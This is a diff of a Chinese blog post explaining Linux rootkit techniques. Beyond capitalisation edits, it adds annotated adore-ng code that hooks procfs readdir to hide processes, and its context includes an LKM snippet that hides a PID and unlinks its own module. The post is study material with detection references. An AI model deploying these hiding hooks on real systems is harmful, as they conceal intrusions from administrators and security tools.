@@ -14,11 +14,11 @@ tags:
 ##  0x00    前言
 本文对rootkit进行一些原理上的整理
 
-##  0x01    Rootkit基础概念
-Rootkit是一种恶意程序，能够隐藏自身及相关活动（如模块、进程、文件、网络连接等），用以规避安全检测工具。一般分为用户态、内核态rootkit两种：
+##  0x01    rootkit基础概念
+rootkit是一种恶意程序，能够隐藏自身及相关活动（如模块、进程、文件、网络连接等），用以规避安全检测工具。一般分为用户态、内核态rootkit两种：
 
--   用户态Rootkit：运行在用户空间，通过劫持库函数或注入进程实现隐藏
--   内核态Rootkit：运行在内核空间，修改内核数据结构或代码，隐蔽性较高，常见基于LKM、eBPF技术实现
+-   用户态rootkit：运行在用户空间，通过劫持库函数或注入进程实现隐藏
+-   内核态rootkit：运行在内核空间，修改内核数据结构或代码，隐蔽性较高，常见基于LKM、eBPF技术实现
 
 一般认为rootkit的特点有：
 
@@ -30,7 +30,7 @@ Rootkit是一种恶意程序，能够隐藏自身及相关活动（如模块、�
 -   自我保护：通过反调试技术阻止分析
 
 ##  0x02    用户态rootkit
-用户态Rootkit运行在用户空间，部署简单但隐蔽性较低
+用户态rootkit运行在用户空间，部署简单但隐蔽性较低
 
 ####    LD_PRELOAD劫持
 通过设置`LD_PRELOAD`加载自定义动态库，覆盖标准库函数。例如，劫持`readdir`隐藏特定文件或目录：
@@ -94,8 +94,8 @@ int main() {
 
 它的原理是利用`ptrace`将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于`LD_PRELOAD`
 
-##  0x03    内核态Rootkit
-内核态Rootkit运行在Ring 0，控制系统资源，隐蔽性极高
+##  0x03    内核态rootkit
+内核态rootkit运行在Ring 0，控制系统资源且隐蔽性极高
 
 ####    系统调用表劫持
 通过修改`sys_call_table`替换系统调用函数。[`sys_call_table`机制](https://pandaychen.github.io/2025/03/01/A-LINUX-KERNEL-TRAVEL-7/#kallsyms)，如替换`sys_getdents`隐藏文件的代码，一般采用LKM技术实现（LKM是唯一支持运行时动态修改内核系统调用表的实用方案）
@@ -139,7 +139,7 @@ static int __init rootkit_init(void) {
 -   提权：修改进程凭证（如`cred`结构体），将普通进程的`UID`/`GID`替换为`0`（即拿到了`root`权限）
 -   无钩子痕迹：不同于系统调用表劫持或函数钩子，DKOM技术不修改代码指针，仅篡改数据，规避了基于代码完整性扫描的检测
 
-介绍两个典型 DKOM Rootkit 案例
+介绍两个典型 DKOM rootkit 案例
 
 1、[Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)
 
@@ -190,6 +190,12 @@ is_invisible(pid_t pid)
 -   [进程隐藏](https://github.com/yaoyumeng/adore-ng/blob/master/adore-ng.c#L193)：同上，也通过修改VFS的`procfs`类型的上述方法来实现
 
 ```CPP
+/*
+patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
+patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
+patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
+patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate);
+*/
 int patch_vfs(const char *p, 
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 			readdir_t *orig_readdir, readdir_t new_readdir
@@ -208,39 +214,80 @@ int patch_vfs(const char *p,
 	
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	if (orig_readdir)
+        //保存原始vfs的实现
 		*orig_readdir = filep->f_op->readdir;
 #else
 	if (orig_iterate)
+        //保存原始vfs的实现
 		*orig_iterate = filep->f_op->iterate;
 #endif
 
 	new_op = (struct file_operations *)filep->f_op;
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
-	new_op->readdir = new_readdir;
+	new_op->readdir = new_readdir;  //替换掉系统的readdir实现
 #else
-	new_op->iterate = new_iterate;
+	new_op->iterate = new_iterate;  //替换掉系统的iterate实现
 	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
 #endif
 
+    // 将filep对象的f_op改为adore的实现
 	filep->f_op = new_op;
 	filp_close(filep, 0);
 	return 0;
 }
 ```
 
+其中上面代码中的`new_readdir`、`new_iterate`对应于下面的实现：
+
+-   `adore_proc_readdir`：针对procfs的`readdir`实现，代码如下
+-   `adore_root_readdir`
+-   `adore_proc_iterate`
+-   `adore_root_iterate`
+
+```CPP
+int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
+{
+	int r = 0;
+
+	spin_lock(&proc_filldir_lock);
+    //proc_filldir是一个全局变量
+	proc_filldir = filldir;
+    // orig_proc_readdir也是全局变量，保存了原始vfs的readdir实现（*orig_readdir = filep->f_op->readdir;）
+	r = orig_proc_readdir(fp, buf, adore_proc_filldir/*funcptr*/);
+	spin_unlock(&proc_filldir_lock);
+	return r;
+}
+
+int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
+{
+	char abuf[128];
+
+	memset(abuf, 0, sizeof(abuf));
+	memcpy(abuf, name, nlen < sizeof(abuf) ? nlen : sizeof(abuf) - 1);
+
+	if (should_be_hidden(adore_atoi(abuf)))
+		return 0;
+
+	if (proc_filldir)
+		return proc_filldir(buf, name, nlen, off, ino, x);
+	return 0;
+}
+```
+
+
 ####    内核模块加载
 大部分内核rootkit都是以可加载内核模块（LKM）形式运行，注册恶意逻辑，如下面的代码，其工作原理是通过LKM加载rootkit，隐藏自身模块，调用`hide_process`隐藏进程
 
 ```CPP
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "Rootkit mount\n");
+    printk(KERN_INFO "rootkit mount\n");
     hide_process(1234); // 隐藏PID 1234
     list_del(&THIS_MODULE->list); // 隐藏模块
     return 0;
 }
 
 static void __exit rootkit_exit(void) {
-    printk(KERN_INFO "Rootkit unmount\n");
+    printk(KERN_INFO "rootkit unmount\n");
 }
 
 module_init(rootkit_init);
@@ -252,9 +299,9 @@ MODULE_LICENSE("GPL");
 -   [Linux中基于eBPF的恶意利用与检测机制](https://www.cnxct.com/evil-use-ebpf-and-how-to-detect-ebpf-rootkit-in-linux/)
 -   [通过chkrootkit学习如何在linux下检测RootKit](https://www.giantbranch.cn/2018/10/09/通过chkrootkit学习如何在linux下检测RootKit/)
 -   [LKM Linux rootkit](https://github.com/f0rb1dd3n/Reptile)
--   [检测Linux Rootkit入侵威胁](https://help.aliyun.com/zh/security-center/user-guide/detect-linux-rootkit-intrusions)
+-   [检测Linux rootkit入侵威胁](https://help.aliyun.com/zh/security-center/user-guide/detect-linux-rootkit-intrusions)
 -   [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)
--   [隐匿与追踪：Rootkit检测与绕过技术分析](https://tiangonglab.github.io/blog/tiangongarticle73/)
+-   [隐匿与追踪：rootkit检测与绕过技术分析](https://tiangonglab.github.io/blog/tiangongarticle73/)
 -   [Linux rootkit 深度分析：可加载内核模块](https://zhuanlan.zhihu.com/p/666203507)
 -   [Linux process injection](https://github.com/W3ndige/linux-process-injection?tab=readme-ov-file)
--   [Linux Rootkit Sample && Rootkit Defenser Analysis](https://www.cnblogs.com/LittleHann/p/3879961.html)
+-   [Linux rootkit Sample && rootkit Defenser Analysis](https://www.cnblogs.com/LittleHann/p/3879961.html)
